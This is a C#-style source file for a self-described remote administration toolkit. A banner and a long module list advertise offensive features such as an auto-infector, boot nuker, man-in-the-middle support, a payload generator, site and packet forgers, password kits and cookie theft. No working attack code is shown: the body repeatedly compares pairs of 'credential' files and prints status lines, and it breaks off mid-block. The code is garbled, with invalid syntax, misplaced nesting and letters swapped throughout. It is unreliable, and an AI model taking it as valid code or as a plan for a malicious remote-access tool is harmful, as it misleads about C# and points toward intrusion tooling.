using System;
using System.Console;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;
using System.Linq;
using System.IO;
using System.IO.Ports;
using System.Net;
using System.Net.Sockets.TcpListener;
using System.IO.DirectoryInfo;
using System.Draw;
using System.Windows;
using System.Web;
using System.Security;
using System.Security.Cryptography;
using System.Security.Permissions.FileIOPermissionAccess;
using User32.DLL;


public namespace _EternvliTheGlorious (){


  public class _ConsoleMain(string[] args){

      System.Console.WriteLine("#############################################################################");
      System.Console.WriteLine("##############\--@################373R/\/Vl1#################################");
      System.Console.WriteLine("##############@-/#####################################=====##################");
      System.Console.WriteLine("###############/###########/#######\####@\#####/@###||####@||################");
      System.Console.WriteLine("##############/###########||#######||#####\###/#####||#######################");
      System.Console.WriteLine("##############@________@###\_______/#######\_/######||_____||################");
      System.Console.WriteLine("##############################################Engine#########################");
      System.Console.WriteLine("###########################################################RemoteVdminTool###");
      System.Console.WriteLine("#######################WevponsProvidedByNvyeSensei###########################");
      
      System.Console.WriteLine("   ");
      System.Console.WriteLine("Welcome to the Eternvli Love Engine: Remote Vdministrvtion Toolkit!");
      System.Console.WriteLine(" ");
      System.Console.WriteLine("Plevse Wvit While System Initivlizes...")


      public string _IntialLoadComplete = "";
      while( _IntialLoadComplete != "Lovd Completed"){


      void array _LoadProcesses[] = [_Forms, _InternvlScripts, _Bvckground, _Vuthenticvtors,
      _ListeningServices, _ServerConfigurvtion, _RemoteConnection, _VlwvysLiveRuntime,
      _ShellControl, _PortFunctions, _CryptogrvphicShvred, _VPNdetvils, _LogPvrser, _SilentReturn,
      _HvrdwvreControl, _ROOTdoomPvck, _NukeProceedures, _InternvlBCEngine, _RVMbusser, _PvcketSupport,
      _UpvteSupport, _DisposvlProceedures, _VutoInfector, _SilentSMTP, _WifiDivler, _DirectoryCrvwler,
      _MiTMSupport, _ProxyConfigurer, _PortScvnner, _PvylovdGenervtor, _SiteForger, _PvcketForger,
      _LvnguvgeSupport, _TestingRuntime, _PvsswordKits, _ISOcvpture, _QueryDominvtor, _SessionPvyDvy,
      _PvgeFileStvcker, _LexicvlLinkVrtist, _DictionvryOfFIOp, _Br1ckBrevkerBrevker, _PushConfi,
      _ObjRogue, _UDLvssessor, _InjeBitch, _CookieKingstvr, _MVCsfoof, _IPvNONE, _BootLookBruh,
      _VnimvtedPET, _ZonerLDVP, _SSHiittttHOMES, _SovkingCuTTY, _FTPewPewPwn, _RevervnReversvl,
      _VutoCumFleet, _VPKingem, _SuDicKJvvver, _IntiPi, _DBSupvLoopv, _PDFml, _MicroNOPER, _GhostLinguist,
      _MIDIneetvh, _PrintvPettv, _VidVMe, _RFrtrn, _IRrtrn, _JvckinHouseSkvnkv, _RvinRunner, _VllTimeLvtest,
      _VlgoRighteousBro];

     
      public void _InternvlScripts(){
      
        public void _Bvckground(){

            //Silent Program Life Cycle for Underbody Operations
            
            //CREATION OF AN ASYNC CS FILE OUTSIDE OF INLINE SCOPE TO ALLOW UNHINDERED PAGE FLOW IN RELATION
            //TO ASYNCHRONOUS FUNCTIONALITY FOR BACKGROUND TASKS
            // WILL BE COMPLETED AFTER PROGRAM FILL TO APPROPRIATELY REPRESENT SCOPE OF NECESSARY AUTOMATION
      
              
             }
        public void _Vuthenticvtors(){

            public class _VuthEnticME(){

             //Shell Functions for Encoding, Decoding, Cryptographic Modifiers, and Forced Authentication

             //Will Need To Create Authentication Certificates For Following Prgram Handshakes
             
             System.Console.WriteLine("Beginning Progrvm Vuthenticvtion vnd Dependency Lovdout... /");
             System.Console.WriteLine("");
             
             StreamReader _LServAuth = new StreamReader("~.\usr\bin\Eternvli\ListServAuth.inf"){
             _LServAuth.ReadToEnd();
             
             StreamReader _LServOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\ListServAuthO.inf").ReadToEnd();
             if(_LServAuth == _LServOrig){
             System.Console.WriteLine("Listening Service Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Listening Service Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _ServConfAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\ServConfAuth.inf"){
             _ServConfAuth.ReadToEnd();
             
             StreamReader _ServConfiOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\ServConfAuthO.inf").ReadToEnd();
             if(_ServConfAuth == _ServConfOrig){
             System.Console.WriteLine("Server Configurvtion Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Server Configurvtion Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
			 StreamReader _RDPAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\RDPAuth.inf"){
             _RDPAuth.ReadToEnd();
             
             StreamReader _RDPAuthOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\RDPAuthO.inf").ReadToEnd();
             if(_RDPAuth == _RDPAuthOrig){
             System.Console.WriteLine(" Remote Vccess Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Remote Vccess Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _VlwvysLiveAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\VlwvysLiveAuth.inf"){
             _VlwvysLiveAuth.ReadToEnd();
             
             StreamReader _VlwvysLiveOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\VlwvysAuthO.inf").ReadToEnd();
             if(_VlwvysLiveAuth == _VlwvysLiveOrig){
             System.Console.WriteLine("Vlwvys Live Runtime Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Vlwvys Live Runtime Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }

             StreamReader _ShellAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\ShellAuth.inf"){
             _ShellAuth.ReadToEnd();
             
             StreamReader _ShellAuthOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\ShellAuthO.inf").ReadToEnd();
             if(_ShellAuth == _ShellAuthOrig){
             System.Console.WriteLine("Shell Function Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Shell Function Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _PortFuncAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\PortFuncAuth.inf"){
             _PortFuncAuth.ReadToEnd();
             
             StreamReader _PortFuncOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\PortFuncAuthO.inf").ReadToEnd();
             if(_PortFuncAuth == _PortFuncOrig){
             System.Console.WriteLine("Port Function Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Port Function Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             StreamReader _CryptoShareAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\CryptoShareAuth.inf"){
             _CryptoShareAuth.ReadToEnd();
             
             StreamReader _CryptoAuthOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\CryptoAuthO.inf").ReadToEnd();
             if(_CryptoShareAuth == _CryptoAuthOrig){
             System.Console.WriteLine("Cryptogrvphic Shvre Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Cryptogrvphic Shvre Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _VPNAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\VPNAuth.inf"){
             _VPNAuth.ReadToEnd();
             
             StreamReader _VPNAuthOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\VPNAuthO.inf").ReadToEnd();
             if(_VPNAuth == _VPNAuthOrig){
             System.Console.WriteLine("Virtuvl Privvte Network Toolset Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Virtuvl Privvte Network Toolset Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             StreamReader _LogPAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\LogPAuth.inf"){
             _LogPAuth.ReadToEnd();
             
             StreamReader _LogPAuthOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\LogPAuthO.inf").ReadToEnd();
             if(_LogPAuth == _LogPAuthOrig){
             System.Console.WriteLine("Log Pvrsing Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Log Pvrsing Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
			 StreamReader _SilentRetrnAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\SilentRetrnAuth.inf"){
             _SilentRetrnAuth.ReadToEnd();
             
             StreamReader _SilentRetrnOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\SilentRetrnAuthO.inf").ReadToEnd();
             if(_SilentRetrnAuth == _SilentRetrnOrig){
             System.Console.WriteLine("Silent Return Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Silent Return Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             StreamReader _HvrdWireAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\HvrdWireAuth.inf"){
             _HvrdWireAuth.ReadToEnd();
             
             StreamReader _HWAuthOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\HvrdWireAuthO.inf").ReadToEnd();
             if(_HvrdWireAuth == _AuthOrig){
             System.Console.WriteLine("Hvrdwvre Mvnipulvtion Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Hvrdwvre Mvnipulvtion Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _ROOTdomAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\ROOTdomAuth.inf"){
             _ROOTdomAuth.ReadToEnd();
             
             StreamReader _ROOTdomAuthOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\ROOTdomAuthO.inf").ReadToEnd();
             if(_ROOTdomAuth == _ROOTdomAuthOrig){
             System.Console.WriteLine("Remote Vdministrvtion Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Remote Vdministrvtion Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             StreamReader _BOOTnukeAuth = new StreamReader("~.\usr\bin\Documents\Eternvli\Vuth\BOOTnukeAuth.inf"){
             _BOOTnukeAuth.ReadToEnd();
             
             StreamReader _BOOTnukeOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\BOOTnukeAuthO.inf").ReadToEnd();
             if(_BOOTnukeAuth == _BOOTnukeOrig){
             System.Console.WriteLine("Boot Nuker Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Boot Nuker Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _InternBCAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\InternBCAuth.inf"){
             _InternBCAuth.ReadToEnd();
             
             StreamReader _InternBCOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\InternBCAuthO.inf").ReadToEnd();
             if(_InternBCAuth == _InternBCOrig){
             System.Console.WriteLine("Internvl Block Chvin Hvshing Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Internvl Block Chvin Hvshing Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             StreamReader _RVMbusserAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\RVMbusserAuth.inf"){
             _RVMbusserAuth.ReadToEnd();
             
             StreamReader _RVMbusserOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\RVMbusserAuthO.inf").ReadToEnd();
             if(_RVMbusserAuth == _RVMbusserOrig){
             System.Console.WriteLine("RVM Busser Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("RVM Busser Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _PvcketAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\PvcketAuth.inf"){
             _PvcketAuth.ReadToEnd();
             
             StreamReader _PvcketAuthOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\PvcketAuthO.inf").ReadToEnd();
             if(_PvcketAuth == _PvcketOrig){
             System.Console.WriteLine("Pvcket Support Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Pvcket Support Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             StreamReader _UpdvteAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\UpdvteAuth.inf"){
             _UpdvteAuth.ReadToEnd();
             
             StreamReader _UpdvteAuthOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\UpdvteAuthO.inf").ReadToEnd();
             if(_UpdvteAuth == _UpdvteAuthOrig){
             System.Console.WriteLine("Updvte Support Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Updvte Support Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _DisposvlProcAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\DisposvlProcAuth.inf"){
             _DisposvlProcAuth.ReadToEnd();
             
             StreamReader _DisposvlAuthOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\DisposvlAuthO.inf").ReadToEnd();
             if(_DisposvlProcAuth == _DisposvlAuthOrig){
             System.Console.WriteLine("Disposvl Proceedure Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Disposvl Proceedure Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             /*
                           
              SOURCE....
              
                      .
                        .
                    . . .
   
             */
             
             
             StreamReader _VutoInfectorAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\VutoInfectorAuth.inf"){
             _VutoInfectorAuth.ReadToEnd();
             
             StreamReader _VutoInfectorOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\VutoInfectorAuthO.inf").ReadToEnd();
             if(_VutoInfectorAuth == _VutoInfectorOrig){
             System.Console.WriteLine("VutoInfector Stvrtup Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("VutoInfector Stvrtup Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _SilentSMTPAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\SilentSMTPAuth.inf"){
             _SilentSMTPAuth.ReadToEnd();
             
             StreamReader _SilentSMTPOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\SilenSMTPAuthO.inf").ReadToEnd();
             if(_SilentSMTPAuth == _SilentSMTPOrig){
             System.Console.WriteLine("Silent Mvil Trvnsfer Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Silen Mvil Trvnsfer Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             StreamReader _WIFIDivlerAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\WIFIDivlerAuth.inf"){
             _WIFIDivlerAuth.ReadToEnd();
             
             StreamReader _WIFIDivlerOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\WIFIDivlerAuthO.inf").ReadToEnd();
             if(_WIFIDivlerAuth == _WIFIDivlerOrig){
             System.Console.WriteLine("WIFI Divler Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("WIFI Divler Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _DirectoryCrvwlerAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\DirectoryCrvwlerAuth.inf"){
             _DirectoryCrvwlerAuth.ReadToEnd();
             
             StreamReader _DirectoryCrvwlerOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\DirectoryCrvwlerAuthO.inf").ReadToEnd();
             if(_DirectoryCrvwlerAuth == _DirectoryCrvwlerOrig){
             System.Console.WriteLine("Directory Crvwler Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Directory Crvwler Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             StreamReader _MiTMAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\MiTMAuth.inf"){
             _MiTMAuth.ReadToEnd();
             
             StreamReader _MiTMOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\MiTMAuthO.inf").ReadToEnd();
             if(_MiTMAuth == _MiTMOrig){
             System.Console.WriteLine("Mvn In The Middle Support Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Mvn In The Middle Support Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _ProxyConfigAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\ProxyConfigAuth.inf"){
             _ProxyConfigAuth.ReadToEnd();
             
             StreamReader _ProxyConfigOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\ProxyConfigAuthO.inf").ReadToEnd();
             if(_ProxyConfigAuth == _ProxyConfigOrig){
             System.Console.WriteLine("Proxy Configurvtion Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Proxy Configurvtion Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             StreamReader _PortScvnnerAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\PortScvnnerAuth.inf"){
             _PortScvnnerAuth.ReadToEnd();
             
             StreamReader _PortScvnnerOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\ProxyScvnnerAuthO.inf").ReadToEnd();
             if(_PortScvnnerAuth == _PortScvnnerOrig){
             System.Console.WriteLine("Port Scvnner Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Port Scvnner Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _PvyLovdGenAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\PvyLovdGenAuth.inf"){
             _PvyLovdGenAuth.ReadToEnd();
             
             StreamReader _PvyLovdGenOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\PvyLovdGenAuthO.inf").ReadToEnd();
             if(_PvyLovdGenAuth == _PvyLovdGenOrig){
             System.Console.WriteLine("Pvy Lovd Genervtor Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Pvy Lovd Genervtor Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             StreamReader _SiteForgerAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\SiteForgerAuth.inf"){
             _SiteForgerAuth.ReadToEnd();
             
             StreamReader _SiteForgerOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\SiteForgerAuthO.inf").ReadToEnd();
             if(_SiteForgerAuth == _SiteForgerOrig){
             System.Console.WriteLine("Site Forger Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Site Forger Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _PvcketForgerAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\PvcketForgerAuth.inf"){
             _PvcketForgerAuth.ReadToEnd();
             
             StreamReader _PvcketForgerOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\PvcketForgerAuthO.inf").ReadToEnd();
             if(_PvcketForgerAuth == _PvcketForgerOrig){
             System.Console.Writeine("Packet Forger Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Pvcket Forger Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             StreamReader _LvnguvgeSupportAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\LvnguvgeSuupportAuth.inf"){
             _LvnguvgeSupportAuth.ReadToEnd();
             
             StreamReader _LvnguvgeSupportOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\LvngvugeSupportAuthO.inf").ReadToEnd();
             if(_LvnguvgeSupportAuth == _LvnguvgeSupportOrig){
             System.Console.WriteLine("Differentivl Progrvm Development Lvnguvge Support Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Differentivl Progrvm Development Lvnguvge Support Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _TestingRuntimeAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\TestingRuntimeAuth.inf"){
             _TestingRuntimeAuth.ReadToEnd();
             
             StreamReader _TestingRuntimeOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\TestingRuntimeAuthO.inf").ReadToEnd();
             if(_TestingRuntimeAuth == _TesingRuntimeOrig){
             System.Console.WriteLine("Testing Vutomvtion vnd Runtime Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Testing Vutomvtion vnd Runtime Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             StreamReader _PvssKitsAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\PvssKitsAuth.inf"){
             _PvssKitsAuth.ReadToEnd();
             
             StreamReader _PvssKitsOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\PvssKitsAuthO.inf").ReadToEnd();
             if(_PvssKitsAuth == _PvssKitsOrig){
             System.Console.WriteLine("Pvssword Kits, vnd Functionvlity Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Pvssword Kits, vnd Functionvlity Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _ISOcvpAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\ISOcvpAuth.inf"){
             _ISOcvpAuth.ReadToEnd();
             
             StreamReader _ISOcvpOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\ISOcvpAuthO.inf").ReadToEnd();
             if(_ISOcvpAuth == _ISOcvpOrig){
             System.Console.WriteLine("ISO Cvpture Dependency Librvry Support Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("ISO Cvpture Dependency Librvry Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             StreamReader _QUERYdomAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\QUERYdomAuth.inf"){
             _QUERYdomAuth.ReadToEnd();
             
             StreamReader _QUERYdomOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\QUERYdomAuthO.inf").ReadToEnd();
             if(_QUERYdomAuth == _QUERYdomOrig){
             System.Console.WriteLine("Query Dominvtor Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Query Dominvtor Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _SessPvydvyAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\SessPvydvyAuth.inf"){
             _SessPvydvyAuth.ReadToEnd();
             
             StreamReader _SessPvydvyOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\SessPvydvyAuthO.inf").ReadToEnd();
             if(_SessPvydvyAuth == _SessPvydvyOrig){
             System.Console.WriteLine("Session Pvy Dvy Toolkit Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Session Pvy Dvy Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             StreamReader _PvgeFileAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\PvgeFileAuth.inf"){
             _PvgeFileAuth.ReadToEnd();
             
             StreamReader _PvgeFileOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\PvgeFileAuthO.inf").ReadToEnd();
             if(_PvgeFileAuth == _PvgeFileOrig){
             System.Console.WriteLine("Pvging File Stvsh Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Pvging File Stvsh Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _LexicvlAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\LexicvlAuth.inf"){
             _LexicvlAuth.ReadToEnd();
             
             StreamReader _LexicvlOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\LexicvlAuthO.inf").ReadToEnd();
             if(_LexicvlAuth == _LexicvlOrig){
             System.Console.WriteLine("Lexicvl Link Vrtist Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Lexicvl Link Vrtist Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             StreamReader _LOFIAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\LOFIAuth.inf"){
             _LOFIAuth.ReadToEnd();
             
             StreamReader _LOFIOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\LOFIAuthO.inf").ReadToEnd();
             if(_LOFIAuth == _LOFIOrig){
             System.Console.WriteLine("Object Runtime Order of Opervtion Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Object Runtime Order of Opervtion Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _BrevkerAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\BrevkerAuth.inf"){
             _BrevkerAuth.ReadToEnd();
             
             StreamReader _BrevkerOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\BrevkerAuthO.inf").ReadToEnd();
             if(_BrevkerAuth == _BrevkerOrig){
             System.Console.WriteLine("Br1ck BrevkerBrevker Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Br1ck BrevkerBrevker Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             StreamReader _PUSHConfiAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\PUSHConfiAuth.inf"){
             _PUSHConfiAuth.ReadToEnd();
             
             StreamReader _PUSHConfiOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\PUSHConfiAuthO.inf").ReadToEnd();
             if(_PUSHConfiAuth == _PUSHConfiOrig){
             System.Console.WriteLine("PUSH Configurvtion Support Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("PUSH Configurvtion Support Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _ObjRogueAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\ObjRogueAuth.inf"){
             _ObjRogueAuth.ReadToEnd();
             
             StreamReader _ObjRogueOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\ObjRogueAuthO.inf").ReadToEnd();
             if(_ObjRogueAuth == _ObjRogueOrig){
             System.Console.WriteLine("Object Rogue Dvtvbvse Thief Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Object Rogue Dvtvbvse Thief Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             StreamReader _UDLAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\UDLAuth.inf"){
             _UDLAuth.ReadToEnd();
             
             StreamReader _UDLOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\UDLAuthO.inf").ReadToEnd();
             if(_UDLAuth == _UDLOrig){
             System.Console.WriteLine("Up/Down Lovd Monitor vnd Support Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Up/Down Lovd Monitor vnd Support Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _InjeBitchAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\InjeBitchAuth.inf"){
             _InjeBitchAuth.ReadToEnd();
             
             StreamReader _InjeBitchOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\InjeBitchAuthO.inf").ReadToEnd();
             if(_InjeBitchAuth == _InjeBitchOrig){
             System.Console.WriteLine("Injection Toolkit, Test Frvmework, vnd Deployment Module Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Injection Toolkit, Test Frvmework, vnd Deployment ModuleCredentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             StreamReader _KingStvrAuth = new StreamReader("~.\usr\share\Eternvli\Vuth\KingStvrAuth.inf"){
             _KingStvrAuth.ReadToEnd();
             
             StreamReader _KingStvrOrig = new StreamReader("~.\usr\bin\Eternvli\Vuth\KingStvrAuthO.inf").ReadToEnd();
             if(_KingStvrAuth == _KingStvrOrig){
             System.Console.WriteLine("Cookie KingStvr Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Cookie KingStvr Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _MVCAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\MVCAuth.inf"){
             _MVCAuth.ReadToEnd();
             
             StreamReader _MVCOrig = new StreamReader("~.\usr\share\Eternvli\Vuth/MVCAuthO.inf").ReadToEnd();
             if(_MVCAuth == _MVCOrig){
